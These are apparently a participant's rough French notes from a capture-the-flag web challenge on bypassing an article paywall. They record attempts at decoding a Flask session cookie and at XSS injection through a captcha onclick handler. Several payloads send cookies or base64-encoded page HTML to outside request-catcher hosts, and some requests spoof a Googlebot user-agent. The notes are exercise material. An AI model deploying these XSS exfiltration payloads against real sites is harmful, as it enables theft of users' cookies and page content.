il y a un paywall sur les articles, go l'exploser

le contenu ne semble pas charge et masque, donc faut aller voir plus loin

-> bouton payer -> no a robot confirm box

avant, j'avais pas vu les class blur qui demasque le contenu, mais c du lorem ipsum

----

bon, on unsign la session ??

install de python + pip install flask-unsign

```
flask-unsign --decode --cookie '1999bffe-c6d3-4ed6-b8f8-0d47d4530528.rFQYrKM1ZTeyNoJ5Xh_EKt18ZRw'
```
output
```
[!] Failed to decode cookie, are you sure this was a Flask session cookie? 'utf-8' codec can't decode byte 0xd7 in position 0: invalid continuation byte
```

ok, c'etait un cookie de session pour ctf.404ctf.fr ...


Il ne semble pas etre possible de compromettre le slug dans l'URL


Ok, on passe a l'injection XSS
-> le captcha a une checkbox avec un onclick, qu'est-ce qu'on peut en faire ?

```
setTimeout(function() {
const XHR=new XMLHttpRequest();
let urlEncodedDataPairs = ['titre=admin cookie', 'message=' + (document.cookies === '' ? 'nop' : document.cookies)];
let urlEncodedData = urlEncodedDataPairs.join("&").replace(/%20/g, "+");
XHR.open("POST", "http://challenge01.root-me.org/web-client/ch18/");
XHR.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
XHR.send(urlEncodedData);
}, 1000);
```
https://abenevaut.free.beeceptor.com
```
setTimeout(function() {const XHR=new XMLHttpRequest();XHR.open("GET", "https://exploit-mag.challenges.404ctf.fr/news/records-inoubliables");XHR.send();}, 1000);
```


-- exfiltration de rien

https://abenevaut.free.beeceptor.com?html=
window.top.location='//abenevaut.free.beeceptor.com?html='.concat(btoa(encodeURIComponent(document.body.innerHTML)))
onerror="window.top.location=%27abenevaut.free.beeceptor.com?html=%27.concat(btoa(encodeURIComponent(document.body.innerHTML)))"
onerror="window.top.location=%27requestbin.cn/16t6uuk1?html=%27.concat(btoa(encodeURIComponent(document.body.innerHTML)))"


-- On repart sur le XHR mais sur la meme url
window.lol = function() {
var xhr = new XMLHttpRequest();
xhr.open("GET", "/news/les-secrets-de-la-preparation-mentale/", false);
xhr.send(null);
console.log(xhr.responseText);
}


-- si j'inject une image est-ce qu'il y a moyen de recuperer une session ?




```
GET https://exploit-mag.challenges.404ctf.fr/news/les-secrets-de-la-preparation-mentale/
Content-Type: application/json
Accept: application/json

###

GET https://exploit-mag.challenges.404ctf.fr/news/dataleak-404-ctf/
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
```